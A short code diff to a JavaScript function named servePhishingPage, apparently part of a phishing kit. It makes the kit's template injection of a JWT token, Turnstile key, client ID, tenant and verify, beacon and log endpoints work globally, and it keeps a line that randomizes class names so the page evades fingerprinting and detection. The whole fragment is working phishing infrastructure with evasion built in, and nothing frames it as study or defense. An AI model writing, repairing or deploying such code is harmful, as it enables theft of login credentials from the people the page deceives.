@@ -61,13 +61,13 @@ async function servePhishingPage(request) {
   
   // Inject dynamic values
   let html = templateHTML
-    .replace('{{JWT_TOKEN}}', jwtToken)
-    .replace('{{TURNSTILE_KEY}}', turnstileKey)
-    .replace('{{CLIENT_ID}}', clientId)
-    .replace('{{TENANT}}', tenant)
-    .replace('{{VERIFY_ENDPOINT}}', VERIFY_ENDPOINT)
-    .replace('{{BEACON_ENDPOINT}}', BEACON_ENDPOINT)
-    .replace('{{LOG_ENDPOINT}}', LOG_ENDPOINT);
+    .replace(/{{JWT_TOKEN}}/g, jwtToken)
+    .replace(/{{TURNSTILE_KEY}}/g, turnstileKey)
+    .replace(/{{CLIENT_ID}}/g, clientId)
+    .replace(/{{TENANT}}/g, tenant)
+    .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
+    .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
+    .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);
   
   // Randomize class names for anti-fingerprinting
   html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');
